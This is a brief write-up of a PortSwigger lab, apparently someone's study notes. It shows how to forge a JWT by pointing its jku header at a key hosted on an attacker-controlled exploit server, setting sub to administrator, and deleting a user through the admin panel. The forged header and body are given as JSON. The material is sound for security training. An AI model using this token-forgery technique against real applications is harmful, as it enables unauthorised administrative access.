# [Lab: JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)

## Lab

This lab uses a JWT-based mechanism for handling sessions. The server supports the  `jku`  parameter in the  [JWT](https://portswigger.net/web-security/jwt)  header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at  `/admin`, then delete the user  `carlos`.

You can log in to your own account using the following credentials:  `wiener:peter`

## Solutions

1. generate rsa key with jwt editor
2. save the key in exploit server: "https://exploit-0ad2000e040deae3c19c3e2201550079.exploit-server.net/exploit"
3. edit jwt:

- jku: url where the key is located
- kid, alg changed by tool

header:

```json
{
    "jku": "https://exploit-0ad2000e040deae3c19c3e2201550079.exploit-server.net/exploit",
    "kid": "5bf6df89-b3ec-45f5-817c-44136956a075",
    "typ": "JWT",
    "alg": "RS256"
}
```

- change "sub":

body:

```json
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1673343544
}
```

sign with the new key. now we can use this jwt to login as administrator and delete carlos account.
